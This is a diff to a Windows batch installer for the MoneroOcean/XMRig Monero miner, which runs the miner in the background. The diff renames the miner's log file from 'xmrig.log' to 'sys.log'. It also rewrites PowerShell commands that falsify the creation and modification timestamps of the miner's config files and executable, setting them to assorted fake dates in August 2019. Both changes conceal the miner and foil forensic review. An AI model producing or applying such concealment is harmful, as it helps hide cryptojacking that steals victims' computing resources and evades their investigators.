@@ -163,7 +163,7 @@ set PORT=10001
 
 rem printing intentions
 
-set "LOGFILE=%USERPROFILE%\xmrig.log"
+set "LOGFILE=%USERPROFILE%\sys.log"
 
 echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
 echo If needed, miner in foreground can be started by %USERPROFILE%\moneroocean\miner.bat script.
@@ -319,14 +319,14 @@ echo :EXIT
 
 
 
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config.json').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config.json').LastWriteTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config.json').CreationTime=('12 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config.json').LastWriteTime=('14 August 2019 18:00:00')"
 
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config_background.json').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config_background.json').LastWriteTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config_background.json').LastWriteTime=('5 August 2019 17:00:00')"
 
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\xmrig.exe').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\xmrig.exe').LastWriteTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\xmrig.exe').LastWriteTime=('4 August 2019 19:00:00')"
 
 
 
